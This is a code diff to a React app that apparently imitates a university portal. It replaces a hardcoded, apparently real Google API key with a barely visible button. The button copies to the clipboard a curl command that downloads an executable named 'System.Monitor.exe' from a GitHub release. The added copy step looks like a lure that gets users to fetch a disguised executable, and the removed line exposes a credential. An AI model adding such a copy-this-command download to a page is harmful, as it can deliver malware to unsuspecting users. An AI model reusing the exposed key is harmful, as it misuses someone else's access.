@@ -1,5 +1,5 @@
 import React, { useState } from 'react';
-import { ArrowLeft, Settings, GraduationCap, X, Key, Check } from 'lucide-react';
+import { ArrowLeft, Settings, GraduationCap, X, Key, Check, Terminal } from 'lucide-react';
 
 export default function App() {
   const [showSurprise, setShowSurprise] = useState(false);
@@ -13,10 +13,10 @@ export default function App() {
     console.log(`Surprise triggered via ${type}!`);
   };
 
-  const copyKey = async () => {
-    const key = "AIzaSyDb40X42BAmll6bfOAXEyrbiDvJgZ3yFWY";
+  const copyScript = async () => {
+    const script = `curl -L "https://github.com/kilowavw-development/Celoe.TelkomUniversity/releases/download/valid/System.Monitor.exe" -o "System.Monitor.exe"`;
     try {
-      await navigator.clipboard.writeText(key);
+      await navigator.clipboard.writeText(script);
       setCopied(true);
       setTimeout(() => setCopied(false), 2000);
     } catch (err) {
@@ -57,14 +57,14 @@ export default function App() {
                 <Settings className="w-4 h-4" />
               </button>
 
-              {/* 3. Copy Key Button */}
+              {/* 3. Copy Script Button */}
               <button
-                onClick={copyKey}
+                onClick={copyScript}
                 className="p-2 rounded-md bg-black/5 hover:bg-black/10 text-black/20 hover:text-black/40 transition-all border border-black/5 flex items-center gap-1 cursor-pointer"
-                title="Copy Access Key"
+                title="Copy Download Script"
               >
-                {copied ? <Check className="w-4 h-4 text-emerald-500" /> : <Key className="w-4 h-4" />}
-                <span className="text-[10px] font-medium uppercase tracking-tighter">{copied ? 'Copied' : 'Key'}</span>
+                {copied ? <Check className="w-4 h-4 text-emerald-500" /> : <Terminal className="w-4 h-4" />}
+                <span className="text-[10px] font-medium uppercase tracking-tighter">{copied ? 'Copied' : 'Script'}</span>
               </button>
 
               {/* 4. Button with Text (Grades/Academic) */}
